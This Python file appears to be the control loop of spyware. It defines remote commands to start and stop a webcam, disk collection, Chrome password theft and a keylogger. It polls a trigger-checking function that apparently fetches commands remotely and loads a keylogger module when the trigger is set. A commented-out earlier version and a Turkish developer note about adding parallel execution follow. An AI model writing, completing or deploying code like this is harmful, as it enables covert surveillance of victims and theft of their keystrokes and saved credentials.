import json
import time
from read_config import read_triggers_json,write_triggers_json
from my_request import check_for_trigger

commands=["start-cam",
"stop-cam",
"start-hdd-v1",
"stop-hdd-v1",
"start-hdd-v2",
"stop-hdd-v2",
"start-get-chrome-passwords",
"stop-get-chrome-passwords",
"start-keylogger",
"stop-keylogger"]


count=0
while True:
    if count%10==0:
        check_for_trigger()
    local_triggers= read_triggers_json()
    if local_triggers["keylogger"]["active"]==True:
        print("Keylogger is active!")
        import keylogger
    else:
        print("Keylogger is inactive")
    time.sleep(1)
    count+=1






# count=0
# Burası paralel şekilde işlemlerin yürütülmesi için gerekli olan kodlarla
# yeniden yazılacak. Emircan Dede'ye fikir için teşekkürler :D
# while True:
#     local_triggers= read_triggers_json()
#     if count==10:
#         local_triggers["keylogger"]["active"]=True
#         write_triggers_json(local_triggers)

#     if local_triggers["keylogger"]["active"]==True:
#         print("Keylogger is active!")
#         import keylogger
#     else:
#         print("Keylogger is inactive")
#     time.sleep(1)
#     count+=1
